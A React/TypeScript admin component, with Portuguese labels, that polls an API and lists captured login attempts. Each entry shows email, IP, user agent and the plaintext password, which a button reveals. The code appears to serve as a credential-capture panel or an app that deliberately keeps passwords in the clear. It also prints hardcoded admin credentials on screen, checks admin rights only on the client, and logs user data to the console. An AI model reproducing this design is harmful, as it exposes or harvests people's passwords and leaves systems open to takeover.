import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { Eye, EyeOff, Clock, User, Shield } from "lucide-react";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { getCurrentUser } from "@/lib/auth";

interface LoginAttempt {
  id: string;
  email: string;
  password: string;
  timestamp: string;
  success: boolean;
  userAgent?: string;
  ip?: string;
}

export default function AdminLogsSection() {
  const [showPasswords, setShowPasswords] = useState(false);
  const currentUser = getCurrentUser();
  
  console.log('👤 AdminLogsSection carregado. Usuário atual:', currentUser);
  console.log('🔑 É admin?', (currentUser as any)?.isAdmin);

  const { data: logs, isLoading, error } = useQuery({
    queryKey: ["/api/admin/login-logs", currentUser?.id, Date.now()], // Adicionando timestamp para forçar refresh
    queryFn: async () => {
      console.log('🔍 Buscando logs para usuário:', currentUser?.id);
      const params = new URLSearchParams({ userId: currentUser?.id || '' });
      const url = `/api/admin/login-logs?${params}`;
      console.log('🌐 URL da requisição:', url);
      const response = await fetch(url, {
        cache: 'no-cache', // Força buscar dados frescos
        headers: {
          'Cache-Control': 'no-cache'
        }
      });
      console.log('📡 Status da resposta:', response.status);
      if (!response.ok) {
        throw new Error(`Erro ${response.status}: ${response.statusText}`);
      }
      const data = await response.json();
      console.log('📊 Dados recebidos:', data);
      console.log('📝 Número de logs:', data?.length || 0);
      return data;
    },
    enabled: !!(currentUser?.id && (currentUser as any)?.isAdmin),
    refetchInterval: 3000, // Atualiza a cada 3 segundos
    staleTime: 0, // Dados sempre considerados desatualizados
    gcTime: 0, // Não manter cache (TanStack Query v5 usa gcTime ao invés de cacheTime)
  });

  // Verificar se o usuário está logado e é admin
  if (!currentUser) {
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-orange-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Login Necessário
        </h3>
        <p className="text-muted-foreground text-center">
          Você precisa fazer login como administrador para acessar os logs.
          <br />
          <span className="text-sm mt-2 block font-mono bg-muted px-2 py-1 rounded">
            admin@gmail.com / 123456
          </span>
        </p>
      </div>
    );
  }

  if (!(currentUser as any)?.isAdmin) {
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-red-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Acesso Negado
        </h3>
        <p className="text-muted-foreground text-center">
          Apenas administradores podem acessar os logs de login.
          <br />
          <span className="text-sm mt-2 block">
            Usuário atual: {currentUser?.email}
          </span>
        </p>
      </div>
    );
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleString("pt-BR");
  };

  const getStatusBadge = (success: boolean) => {
    return success ? (
      <Badge className="bg-green-500/10 text-green-600" data-testid="badge-success">
        Sucesso
      </Badge>
    ) : (
      <Badge variant="destructive" data-testid="badge-failed">
        Falhou
      </Badge>
    );
  };

  const truncatePassword = (password: string) => {
    if (!showPasswords) {
      return "••••••••";
    }
    return password;
  };

  if (error) {
    console.error('Error fetching logs:', error);
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-red-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Erro ao Carregar Logs
        </h3>
        <p className="text-muted-foreground text-center">
          Erro: {error?.message || 'Erro desconhecido'}
        </p>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="space-y-6">
        <div className="animate-pulse">
          <div className="h-8 bg-muted rounded mb-6"></div>
          <div className="space-y-4">
            {[...Array(5)].map((_, i) => (
              <Skeleton key={i} className="h-20 w-full" />
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div className="flex items-center space-x-3">
          <div className="w-10 h-10 bg-red-500/10 rounded-lg flex items-center justify-center">
            <Shield className="text-red-500 h-5 w-5" />
          </div>
          <div>
            <h3 className="text-xl font-semibold text-card-foreground" data-testid="text-logs-title">
              Logs de Login
            </h3>
            <p className="text-sm text-muted-foreground">
              Todas as tentativas de login capturadas
            </p>
          </div>
        </div>
        <Button
          variant="outline"
          onClick={() => setShowPasswords(!showPasswords)}
          data-testid="button-toggle-passwords"
        >
          {showPasswords ? (
            <>
              <EyeOff className="mr-2 h-4 w-4" />
              Ocultar Senhas
            </>
          ) : (
            <>
              <Eye className="mr-2 h-4 w-4" />
              Mostrar Senhas
            </>
          )}
        </Button>
      </div>

      <Card data-testid="card-login-logs">
        <CardHeader>
          <CardTitle className="flex items-center justify-between">
            <span>Tentativas de Login Recentes</span>
            <Badge variant="secondary" data-testid="badge-total-logs">
              {(logs as LoginAttempt[])?.length || 0} registros
            </Badge>
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {(logs as LoginAttempt[])?.length > 0 ? (
              (logs as LoginAttempt[]).map((log, index) => (
                <div
                  key={log.id}
                  className="flex items-center justify-between p-4 bg-muted rounded-lg"
                  data-testid={`log-entry-${index}`}
                >
                  <div className="flex items-center space-x-4 flex-1">
                    <div className={`w-10 h-10 ${log.success ? "bg-green-500/10" : "bg-red-500/10"} rounded-lg flex items-center justify-center`}>
                      <User className={`${log.success ? "text-green-500" : "text-red-500"} h-5 w-5`} />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center space-x-3 mb-1">
                        <p className="font-medium text-card-foreground" data-testid={`log-email-${index}`}>
                          {log.email}
                        </p>
                        {getStatusBadge(log.success)}
                      </div>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-sm text-muted-foreground">
                        <div className="flex items-center space-x-1">
                          <span className="font-medium">Senha:</span>
                          <span className="font-mono bg-background px-2 py-1 rounded" data-testid={`log-password-${index}`}>
                            {truncatePassword(log.password)}
                          </span>
                        </div>
                        <div className="flex items-center space-x-1">
                          <Clock className="h-3 w-3" />
                          <span data-testid={`log-timestamp-${index}`}>
                            {formatDate(log.timestamp)}
                          </span>
                        </div>
                        <div className="flex items-center space-x-1 truncate">
                          <span className="font-medium">IP:</span>
                          <span data-testid={`log-ip-${index}`}>
                            {log.ip || "N/A"}
                          </span>
                        </div>
                      </div>
                      {log.userAgent && (
                        <div className="mt-1 text-xs text-muted-foreground truncate">
                          <span className="font-medium">User-Agent:</span> {log.userAgent}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              ))
            ) : (
              <div className="text-center py-8">
                <Shield className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
                <p className="text-muted-foreground" data-testid="text-no-logs">
                  Nenhuma tentativa de login registrada ainda
                </p>
              </div>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}